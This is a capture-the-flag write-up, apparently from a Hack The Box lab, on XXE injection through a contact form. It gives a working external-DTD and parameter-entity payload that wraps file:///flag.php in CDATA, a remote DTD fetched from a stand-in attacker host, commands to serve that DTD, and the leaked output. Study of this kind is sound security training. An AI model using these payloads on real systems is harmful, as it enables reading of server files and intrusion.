# 🧨 XXE Exfiltration via External DTD (Advanced CDATA Injection)
## 📌 Target
**URL**: `http://10.129.64.249/submitDetails.php`
**Vulnerability**: XML External Entity Injection (XXE) using external DTD and parameter entities
**Goal**: Exfiltrate the contents of `flag.php`

## 🧠 Vulnerability Summary
While interacting with the contact form on the target web application, XML data was found to be sent via a POST request using the Content-Type: text/plain. The application reflected certain elements of the request, indicating potential for XML External Entity (XXE) injection.

The server was also found to parse XML input without restrictions on external entities. However, the usual entity concatenation techniques failed due to the prohibition on mixing internal and external entities. To bypass this, parameter entities (%) and an external DTD were used to wrap file contents in a CDATA block.

## 🧪 Exploit Strategy
The attack used a two-part payload:

Remote DTD hosted on attacker machine to define a joined parameter entity:
```bash
<!-- xxe.dtd -->
<!ENTITY % all "<!ENTITY &#x25; joined '%begin;%file;%end;'>">
%all;
```
Malicious XML that references the external DTD and displays &joined; where the file content is injected:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///flag.php">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://<attacker-ip>:8000/xxe.dtd">
    %dtd;
    %joined;
]>
<root>
    <name>Manoj</name>
    <tel>0411639525</tel>
    <email>&joined;</email>
    <message>thank you</message>
</root>
```
## 🖥️ Hosting the Payload
Host the `xxe.dtd` file using a Python HTTP server:
```bash
echo '<!ENTITY % all "<!ENTITY &#x25; joined \'%begin;%file;%end;\'>">' > xxe.dtd
python3 -m http.server 8000
```
Ensure the target machine can reach your IP (<attacker-ip>), which must be replaced in the SYSTEM reference.

## ✅ Successful Exploitation
Upon sending the crafted XML payload, the response returned:
```bash
Check your email 
<?php $flag = "HTB{example_flag_contents}"; ?> 
for further instructions.
```
![image](https://github.com/user-attachments/assets/973424ea-57b2-42ea-896d-72d3b62c4e85)

This confirmed that the contents of `flag.php` were successfully read and displayed using CDATA-wrapped XXE injection via an external DTD.

